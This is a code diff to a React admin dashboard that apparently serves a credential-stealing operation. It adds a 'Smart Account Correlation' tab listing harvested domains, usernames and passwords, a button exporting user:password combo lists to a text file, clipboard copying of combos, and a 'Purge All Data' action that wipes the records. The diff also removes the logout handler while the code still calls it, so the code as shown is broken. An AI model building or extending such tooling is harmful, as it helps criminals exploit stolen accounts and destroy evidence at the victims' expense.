@@ -8,8 +8,9 @@ function App() {
   const [activeTab, setActiveTab] = useState('captures')
   const [captures, setCaptures] = useState([])
   const [credentials, setCredentials] = useState([])
+  const [accounts, setAccounts] = useState([])
   const [loading, setLoading] = useState(false)
-  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0 })
+  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0, total_accounts: 0 })
   const [error, setError] = useState(null)
   const [searchTerm, setSearchTerm] = useState('')
   const [typeFilter, setTypeFilter] = useState('ALL')
@@ -45,7 +46,11 @@ function App() {
     setLoading(true)
     setError(null)
     try {
-      const endpoint = activeTab === 'captures' ? '/captures' : '/credentials'
+      let endpoint = ''
+      if (activeTab === 'captures') endpoint = '/captures'
+      else if (activeTab === 'credentials') endpoint = '/credentials'
+      else if (activeTab === 'accounts') endpoint = '/accounts'
+
       const queryParams = new URLSearchParams({
         capture_type: typeFilter,
         search: debouncedSearch
@@ -71,9 +76,12 @@ function App() {
       if (activeTab === 'captures') {
         setCaptures(json.data || [])
         setStats(prev => ({ ...prev, total_captures: json.total || 0 }))
-      } else {
+      } else if (activeTab === 'credentials') {
         setCredentials(json.data || [])
         setStats(prev => ({ ...prev, total_credentials: json.total || 0 }))
+      } else if (activeTab === 'accounts') {
+        setAccounts(json.data || [])
+        setStats(prev => ({ ...prev, total_accounts: json.total || 0 }))
       }
       setSelectedIds([]) // Reset selection on new data
     } catch (err) {
@@ -139,10 +147,45 @@ function App() {
     setIsAuthenticated(true)
   }
 
-  const handleLogout = () => {
-    localStorage.removeItem('admin_api_key')
-    setToken('')
-    setIsAuthenticated(false)
+  const handlePurgeData = async () => {
+    const confirmKey = window.prompt('CRITICAL: This will PERMANENTLY delete ALL database records. Please enter your ADMIN API KEY to confirm:')
+    if (!confirmKey) return
+
+    if (confirmKey !== token) {
+      alert('Verification Failed: Invalid API Key.')
+      return
+    }
+
+    if (!window.confirm('FINAL WARNING: Are you absolutely sure you want to nuke the entire database? This cannot be undone.')) return
+
+    setLoading(true)
+    try {
+      const res = await fetch(`/v1/admin/purge`, {
+        method: 'DELETE',
+        headers: { 'Authorization': `Bearer ${token}` }
+      })
+      if (res.status === 401) handleLogout()
+      else fetchData()
+      alert('Database purged successfully.')
+    } catch (err) {
+      alert('Purge operation failed')
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  const handleExportAccounts = () => {
+    if (accounts.length === 0) return
+    const comboList = accounts.map(acc => `${acc.user}:${acc.password}`).join('\n')
+    const blob = new Blob([comboList], { type: 'text/plain' })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement('a')
+    a.href = url
+    a.download = `combos_${new Date().toISOString().split('T')[0]}.txt`
+    document.body.appendChild(a)
+    a.click()
+    document.body.removeChild(a)
+    URL.revokeObjectURL(url)
   }
 
   if (!isAuthenticated) {
@@ -169,6 +212,12 @@ function App() {
           >
             Extracted Data
           </button>
+          <button
+            className={activeTab === 'accounts' ? 'active' : ''}
+            onClick={() => setActiveTab('accounts')}
+          >
+            Smart Accounts
+          </button>
         </nav>
         <div className="sidebar-stats">
           <div className="stat-item">
@@ -179,14 +228,26 @@ function App() {
             <label>Credentials</label>
             <span>{stats.total_credentials}</span>
           </div>
+          <div className="stat-item">
+            <label>Accounts</label>
+            <span>{stats.total_accounts}</span>
+          </div>
+          <button className="purge-btn" onClick={handlePurgeData}>Purge All Data</button>
           <button className="logout-btn" onClick={handleLogout}>Disconnect Node</button>
         </div>
       </aside>
 
       <main className="content">
         <header className="content-header">
-          <h1>{activeTab === 'captures' ? 'Audit Logs' : 'Credential Extraction'}</h1>
+          <h1>
+            {activeTab === 'captures' ? 'Audit Logs' :
+              activeTab === 'credentials' ? 'Credential Extraction' :
+                'Smart Account Correlation'}
+          </h1>
           <div className="header-actions">
+            {activeTab === 'accounts' && (
+              <button className="export-btn" onClick={handleExportAccounts}>📥 Export .txt</button>
+            )}
             <button className="refresh-btn" onClick={fetchData}>Refresh</button>
           </div>
         </header>
@@ -274,7 +335,7 @@ function App() {
                   ))}
                 </tbody>
               </table>
-            ) : (
+            ) : activeTab === 'credentials' ? (
               <div className="creds-grid">
                 {credentials.map(cr => (
                   <div key={cr.id} className="cred-card glass">
@@ -290,6 +351,41 @@ function App() {
                     </div>
                     <div className="cred-footer">
                       <span className="cred-type">{cr.capture_type}</span>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="accounts-grid">
+                {accounts.map(acc => (
+                  <div key={acc.capture_id} className="account-card glass animate-fade">
+                    <div className="account-header">
+                      <span className="account-domain">{acc.domain}</span>
+                      <span className="account-time">{new Date(acc.timestamp).toLocaleDateString()}</span>
+                    </div>
+                    <div className="account-combo">
+                      <div className="combo-strip">
+                        <span className="combo-user">{acc.user}</span>
+                        <span className="combo-sep">:</span>
+                        <span className="combo-pass">{acc.password}</span>
+                      </div>
+                      <button
+                        className="copy-combo-btn"
+                        onClick={() => {
+                          navigator.clipboard.writeText(`${acc.user}:${acc.password}`)
+                          alert('Combo copied to clipboard!')
+                        }}
+                      >
+                        📋 Copy
+                      </button>
+                    </div>
+                    <div className="account-details">
+                      {Object.entries(acc.all_fields).map(([k, v]) => (
+                        <div key={k} className="detail-row">
+                          <label>{k}:</label>
+                          <span>{v}</span>
+                        </div>
+                      ))}
                     </div>
                   </div>
                 ))}
